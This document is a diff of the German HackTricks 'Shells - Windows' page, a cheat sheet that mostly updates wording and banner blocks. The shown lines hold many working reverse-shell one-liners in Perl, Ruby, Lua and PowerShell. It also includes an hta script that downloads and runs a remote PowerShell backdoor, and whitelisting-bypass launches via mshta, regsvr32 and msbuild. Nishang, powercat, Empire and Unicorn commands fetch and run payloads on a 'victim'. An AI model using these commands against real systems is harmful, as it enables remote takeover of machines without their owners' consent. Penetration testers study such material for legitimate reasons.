@@ -1,18 +1,19 @@
 # Shells - Windows
 
+{% hint style="success" %}
+Lernen Sie & üben Sie AWS-Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen Sie & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-Andere Möglichkeiten, HackTricks zu unterstützen:
-
-* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys senden.
 
 </details>
+{% endhint %}
 
 **Try Hard Security Group**
 
@@ -52,21 +53,19 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 ```
 ## Perl
 
-Perl ist eine beliebte Skriptsprache, die von Hackern verwendet wird, um Windows-Systeme zu kompromittieren. Es gibt verschiedene Tools und Skripte, die in Perl geschrieben sind und die bei der Erstellung von Backdoors, dem Sammeln von Informationen und anderen Angriffen auf Windows-Systeme helfen. Perl-Skripte können auf Windows-Systemen ausgeführt werden, sofern Perl auf dem Zielsystem installiert ist.
+Perl ist eine beliebte Skriptsprache, die von Hackern häufig verwendet wird, um Shell-Skripte auf Windows-Systemen auszuführen. Es bietet leistungsstarke Funktionen und ist in der Regel auf den meisten Windows-Systemen vorinstalliert.
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
 
-Ruby ist eine dynamische, objektorientierte Skriptsprache, die für die Entwicklung von Webanwendungen und als Skriptsprache für Systemadministration und Automatisierung verwendet wird. Es gibt verschiedene Shells, die Ruby-Code ausführen können, wie z. B. IRB (Interactive Ruby) und Pry. Diese Shells bieten eine interaktive Umgebung zum Testen und Ausführen von Ruby-Code.
+Ruby ist eine dynamische, objektorientierte Skriptsprache, die für die Entwicklung von Webanwendungen und Skripten verwendet wird. Es bietet eine einfache Syntax und eine Vielzahl von Bibliotheken, die das Schreiben von Code erleichtern. Ruby wird häufig für die Entwicklung von Webanwendungen mit dem Ruby on Rails Framework verwendet.
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
-
-Lua ist eine leistungsstarke, effiziente, leichtgewichtige und eingebettete Skriptsprache. Lua wird häufig für die Erweiterung von Anwendungen und die Automatisierung von Aufgaben verwendet. Lua-Skripte können in verschiedenen Umgebungen ausgeführt werden und sind besonders beliebt in Spielen und Anwendungen, die anpassbare Skriptfunktionen benötigen. Lua bietet eine einfache Syntax und eine umfangreiche Standardbibliothek, die es zu einer vielseitigen Option für Entwickler macht.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -100,6 +99,8 @@ powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 Prozess, der Netzwerkanruf ausführt: **svchost.exe**\
 Payload auf Festplatte geschrieben: **WebDAV-Client-Lokalcache**
+
+**Einzeiler:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -119,13 +120,13 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Beispiel für eine hta-psh Reverse-Shell (Verwendung von hta zum Herunterladen und Ausführen eines PS-Backdoors)**
+#### **Beispiel für eine hta-psh Reverse-Shell (Verwendung von hta zum Herunterladen und Ausführen des PS-Backdoors)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Sie können sehr einfach einen Koadic-Zombie herunterladen und ausführen, indem Sie den Stager HTA verwenden**
+**Sie können sehr einfach einen Koadic-Zombie herunterladen und ausführen, indem Sie den Stager hta verwenden**
 
-#### HTA Beispiel
+#### hta Beispiel
 
 [**Von hier aus**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 ```xml
@@ -161,8 +162,6 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 </scriptlet>
 ```
 #### **Mshta - Metasploit**
-
-Mshta is a utility in Windows that executes Microsoft HTML Applications (HTA). Metasploit has a module that can be used to execute malicious HTA payloads using mshta.exe. This technique can be used to bypass application whitelisting and execute code on a target system.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -264,7 +263,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Sie können sehr einfach einen Koadic-Zombie mithilfe des Stagers regsvr herunterladen und ausführen**
+**Sie können sehr einfach einen Koadic Zombie mithilfe des Stagers regsvr herunterladen und ausführen**
 
 ## Certutil
 
@@ -340,7 +339,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 **Nicht erkannt**
 
-**Sie können sehr einfach einen Koadic-Zombie herunterladen und ausführen, indem Sie den Stager wmic verwenden**
+**Sie können sehr einfach einen Koadic Zombie herunterladen und ausführen, indem Sie den Stager wmic verwenden**
 
 ## Msbuild
 
@@ -348,7 +347,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Du kannst diese Technik verwenden, um Anwendungs-Whitelisting und Powershell.exe-Beschränkungen zu umgehen. Da du mit einer PS-Shell aufgefordert wirst.\
+Du kannst diese Technik verwenden, um Anwendungs-Whitelisting und Powershell.exe-Beschränkungen zu umgehen. Du wirst mit einer PS-Shell aufgefordert.\
 Lade dies einfach herunter und führe es aus: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -361,7 +360,7 @@ Kompilieren Sie C#-Code auf dem Opferrechner.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Du kannst eine grundlegende C#-Umkehrschale von hier herunterladen: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Du kannst eine einfache C# Reverse-Shell von hier herunterladen: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Nicht erkannt**
 
@@ -385,17 +384,17 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
 
-## Powershell Shells
+## Powershell-Shells
 
 ### PS-Nishang
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Im **Shells**-Ordner gibt es viele verschiedene Shells. Um _Invoke-PowerShellTcp.ps1_ herunterzuladen und auszuführen, machen Sie eine Kopie des Skripts und fügen am Ende der Datei hinzu:
+Im **Shells**-Ordner gibt es viele verschiedene Shells. Um die Datei Invoke-_PowerShellTcp.ps1_ herunterzuladen und auszuführen, machen Sie eine Kopie des Skripts und fügen am Ende der Datei hinzu:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Starten Sie das Skript auf einem Webserver und führen Sie es auf der Seite des Opfers aus:
+Starte den Skript-Server und führe ihn auf dem Endgerät des Opfers aus:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -436,7 +435,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Erstellen Sie einen Powershell-Launcher, speichern Sie ihn in einer Datei und laden Sie ihn herunter und führen Sie ihn aus.
+Erstellen Sie einen PowerShell-Launcher, speichern Sie ihn in einer Datei und laden Sie ihn herunter und führen Sie ihn aus.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -446,7 +445,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Erstellen Sie eine PowerShell-Version des Metasploit-Backdoors mit Einhorn
+Erstellen Sie eine Powershell-Version des Metasploit-Backdoors unter Verwendung von Einhorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -454,7 +453,7 @@ Starte msfconsole mit der erstellten Ressource:
 ```
 msfconsole -r unicorn.rc
 ```
-Starte einen Webserver, der die Datei _powershell\_attack.txt_ bereitstellt, und führe im Opfer aus:
+Starten Sie einen Webserver, der die Datei _powershell\_attack.txt_ bereitstellt, und führen Sie im Opfer aus:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -462,7 +461,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## Mehr
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) PS-Konsole mit einigen offensiven PS-Modulen vorab geladen (verschlüsselt)\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) PS-Konsole mit einigen vorab geladenen offensiven PS-Modulen (verschlüsselt)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) PS-Konsole mit einigen offensiven PS-Modulen und Proxy-Erkennung (IEX)
 
@@ -482,16 +481,17 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS-Konsole mit einigen offensi
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+Lerne & übe AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Unterstütze HackTricks</summary>
 
-Andere Möglichkeiten, HackTricks zu unterstützen:
-
-* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Trete der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichst.
 
 </details>
+{% endhint %}
